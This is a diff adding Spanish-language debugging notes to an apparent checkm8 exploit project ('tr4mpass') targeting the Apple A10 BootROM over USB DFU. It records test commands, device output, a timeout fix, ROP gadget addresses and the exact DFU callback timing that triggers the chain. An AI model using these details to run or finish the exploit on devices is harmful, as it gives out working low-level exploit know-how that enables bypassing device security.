@@ -1990,7 +1990,165 @@ accesible en la VA del BootROM sin necesidad de remapear con nuestra page table.
 | Canary aparece sin DIAG (PWND?) | write_ttbr0/tlbi problema, pero shellcode funciona sin MMU |
 
 ### Estado actual:
+✅ Ejecutado - resultado NEGATIVO (2026-06-09)
+
+---
+
+## v1.0.46 — RESULTADO: canary 0x41 NO apareció NI con SKIP_MMU (2026-06-09 ~16:27-16:32)
+
+### Comando ejecutado:
+```bash
+sudo CHECKM8_DIAG_SHELLCODE=1 CHECKM8_SKIP_MMU=1 ./tr4mpass
+```
+
+### Resultado:
+```
+BLACK: [SKIP_MMU] exec_addr=0x1800B0610 (raw, no TTBR0 remap)
+BLACK: serial = [43 C0 A4 70 53 59] — IDÉNTICO en los 3 intentos, sin 0x41
+WHITE: [SKIP_MMU] exec_addr=0x1800B0610 (raw, no TTBR0 remap)
+WHITE: serial = [43 70 F5 D3 EE 5A] — sin 0x41
+```
+
+**Nota importante:** El BLACK siempre retorna `[43 C0 A4 70 53 59]` — **100% idéntico entre intentos**. Esto no es garbage random. Es un valor fijo. El BootROM NO está ejecutando NADA de nuestro código.
+
+### Conclusión definitiva tras v1.0.46:
+
+**Las 3 hipótesis se resumen en una sola causa raíz:**
+
+El ROP chain **nunca se activa** porque nunca llegamos al punto del DFU state machine donde el BootROM ejecuta los callbacks.
+
+---
+
+## Análisis de Causa Raíz — ROOT CAUSE IDENTIFICADA (2026-06-09)
+
+### El DFU callback en el A10 BootROM se activa en el MANIFEST phase, NO durante el STATUS del DNLOAD
+
+**Flujo DFU que gaster ejecuta para A10:**
+```
+1. DNLOAD(payload_data, 1592 bytes)    → BootROM ACK STATUS (host espera indefinidamente)
+2. DNLOAD(suffix, 16 zero bytes)       → BootROM ACK STATUS
+3. DNLOAD(0 bytes)                     → BootROM ACK STATUS → transiciona a MANIFEST_SYNC
+4. GET_STATUS → MANIFEST_SYNC         ← AQUÍ el BootROM llama el callback → ROP ejecuta
+5. GET_STATUS → MANIFEST              ← callback ya ejecutó, BootROM hace lo que el ROP le dice
+6. GET_STATUS → MANIFEST_WAIT_RESET
+```
+
+**Nuestro flujo con timeout=1000ms:**
+```
+1. DNLOAD(payload_data, 1592 bytes)    → TIMEOUT después de 1000ms → libusb cancela transfer
+   actual=1592 completed=1 → datos llegaron, pero STATUS IN nunca respondido
+2. EP0 está wedged → suffix TIMEOUT
+3. zero-length DNLOAD TIMEOUT
+4. No llegamos a MANIFEST_SYNC → callback NUNCA se activa
+```
+
+### ¿Por qué el STATUS del payload DNLOAD tarda más de 1000ms?
+
+El BootROM A10 procesa los 1592 bytes del payload y los escribe al io_buffer (0x1800B0000). Este proceso puede tardar más de 1 segundo en condiciones normales en Linux (overhead de xHCI, DMA, etc.). Con 1000ms de timeout, cancelamos antes de que el BootROM pueda ACK el STATUS.
+
+### ¿Por qué `actual=1592 completed=1`?
+
+`actual=1592` → los 1592 bytes llegaron al BootROM (el DATA OUT phase completó).
+`completed=1` → libusb marcó la transfer como completada (TIMED_OUT = el host canceló esperando el STATUS IN).
+
+El BootROM recibió los datos pero el host se rindió antes de recibir el ACK del STATUS. Sin el STATUS IN, el BootROM se queda esperando en estado DNLOAD_SYNC y el EP0 queda semibloqueado.
+
+---
+
+## v1.0.47 — Fix: payload timeout 1000ms → 10000ms (2026-06-09)
+
+### Cambio:
+```c
+// include/exploit/checkm8_internal.h
+#define CHECKM8_A10_LINUX_PAYLOAD_TIMEOUT_MS  10000  // antes: 1000
+```
+
+### Hipótesis:
+Con 10s el BootROM tiene tiempo suficiente para:
+- Procesar los 1592 bytes del payload
+- ACK el STATUS del DNLOAD
+- El EP0 queda en estado DNLOAD_IDLE (no wedged)
+- Podemos enviar el suffix (16 bytes) → ACK
+- Podemos enviar el zero-length DNLOAD → ACK → MANIFEST_SYNC
+- `send_dfu_finalize` hace los 3 GET_STATUS polls
+- Durante el primer GET_STATUS (MANIFEST_SYNC), el BootROM ejecuta el callback → ROP chain → shellcode ejecuta → canary 0x41 → PWND
+
+### Qué esperar en los logs:
+```
+send_payload_chunks: offset=0 ret=0 (Success) actual=1592   ← nuevo: no más TIMED_OUT
+send_dfu_finalize: suffix send ret=16                        ← nuevo: suffix OK
+send_dfu_finalize: zero-length send ret=0                   ← nuevo: zlen OK
+send_dfu_finalize: status1 state=0x07 (MANIFEST_SYNC)       ← nuevo: callback activa
+```
+
+### Comando a ejecutar:
+```bash
+# Normal (con write_ttbr0/tlbi + exec al alias SRAM)
+sudo CHECKM8_DIAG_SHELLCODE=1 ./tr4mpass
+
+# Si no aparece canary, probar también SKIP_MMU
+sudo CHECKM8_DIAG_SHELLCODE=1 CHECKM8_SKIP_MMU=1 ./tr4mpass
+```
+
+### Estado:
+- ✅ Implementado y pusheado (commit 0d12b1b)
 - Pendiente de prueba en dispositivo
+
+---
+
+## Research Confirmation — Gadgets + Timing (2026-06-09)
+
+### Gadgets verificados contra ipwndfu/checkm8.py (axi0mX):
+
+| Gadget | Dirección | Estado |
+|--------|-----------|--------|
+| write_ttbr0 | 0x1000003E4 | ✅ CONFIRMED — ipwndfu `t8010_write_ttbr0` |
+| tlbi | 0x100000434 | ✅ CONFIRMED — ipwndfu `t8010_tlbi` |
+| func_gadget | 0x10000CC4C | ✅ CONFIRMED — ipwndfu `t8010_func_gadget` |
+| nop_gadget | 0x10000CC6C | ✅ CONFIRMED — ipwndfu `t8010_nop_gadget` |
+| ret_gadget | 0x10000CC70 | ✅ CONFIRMED — 4 bytes después de nop_gadget |
+
+**Todos los gadgets son correctos.** El problema nunca estuvo en los gadgets.
+
+### Timing exacto del callback (confirmado por research):
+
+El callback se activa en el **STATUS PHASE del zero-length DFU_DNLOAD** (el tercer transfer después del payload):
+
+```
+1. DNLOAD(payload, 1592 bytes)   → BootROM ACKs STATUS  → DFU state: DNLOAD_IDLE
+2. DNLOAD(suffix, 16 zero bytes) → BootROM ACKs STATUS  → DFU state: DNLOAD_IDLE  
+3. DNLOAD(0 bytes = ZLP)         → STATUS PHASE → usb_core_complete_endpoint_io()
+                                   ↑ AQUÍ el BootROM llama el callback corrompido
+                                   ↑ func_gadget ejecuta → ROP chain → shellcode
+4. GET_STATUS → MANIFEST_SYNC    ← host polling, callback ya ejecutó
+5. GET_STATUS → MANIFEST
+6. GET_STATUS → MANIFEST_WAIT_RESET
+```
+
+**usb_core_complete_endpoint_io()** es la función del BootROM que invoca el `callback`
+field del `io_request` corrupto (puesto por el overwrite). Esto ocurre cuando procesa
+el STATUS phase del zero-length DNLOAD (ZLP).
+
+### Por qué nunca llegamos al ZLP:
+
+Con `payload_timeout = 1000ms`:
+- El DNLOAD(payload) timeout → EP0 queda en DNLOAD_SYNC (semibloqueado)
+- El suffix DNLOAD → timeout (EP0 colgado)  
+- El ZLP → timeout → **el callback NUNCA se activa**
+
+Con `payload_timeout = 10000ms` (v1.0.47):
+- El DNLOAD(payload) completa dentro de 10s → BootROM ACKs STATUS
+- El suffix → OK
+- El ZLP → STATUS PHASE → **callback activa** → ROP chain → shellcode → PWND
+
+### Nota sobre nop_gadget:
+`nop_gadget = 0x10000CC6C` NO es un NOP vacío. Reescribe el Link Register (LR)
+al stack frame anterior para evitar que el BootROM llame `free()` en el buffer
+corrompido después del exploit. Es un gadget crítico para evitar heap panic.
+
+
+
+
 
 
 
